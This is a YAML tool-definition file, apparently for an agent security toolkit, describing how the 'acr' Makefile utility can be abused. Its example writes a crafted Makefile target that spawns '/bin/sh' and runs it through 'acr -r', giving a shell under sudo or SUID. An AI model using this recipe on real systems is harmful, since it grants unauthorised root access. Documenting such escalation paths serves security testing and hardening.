---
id: build-automake-acr
namespace: build:automake:acr
name: acr
description: Automatic Makefile dependency generator that can execute arbitrary commands through Makefile rules.
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - security.execution.command
  - security.privilege-escalation.shell
platforms:
  - linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies: []
related_tools:
  - make
  - autoreconf
artifacts: []
workflow_edges:
  produces:
    - shell-access
    - command-output
  consumes:
    - temp-file
contract:
  inputs:
    - type: system.file.path
      description: Path to Makefile fragment
  outputs:
    - type: process.output
      description: Command execution output
  side_effects:
    - process_spawn
    - filesystem_write
  resource_cost:
    cpu: low
    memory_mb: 8
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 8
  network: low
  disk_io: low
allowed-tools:
  - acr
  - Bash
  - execFile
parameters:
  - name: r
    type: string
    required: false
    description: "Set the -r parameter"
    aliases:
      - -r
features:
  - process-manip
execution:
  template: "acr {r}"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
  - description: Execute arbitrary command via crafted Makefile
    command: |-
      echo -e 'x:\n\t/bin/sh 1>&0 2>&0' >/path/to/temp-file
      chmod +x /path/to/temp-file
      acr -r ./relative/path/to/temp-file
references:
  - label: "acr manual"
    url: "https://www.gnu.org/software/automake/manual/"
techniques:
  - privilege-escalation
  - execution
install:
    - method: apt
      package_name: "autoconf"
      commands:
        - "apt-get install -y autoconf"
---


# acr — Automatic Makefile Dependency Generator

acr generates Makefile dependencies. It can be abused to execute arbitrary commands when used with sudo or SUID by crafting a Makefile with a shell command target.
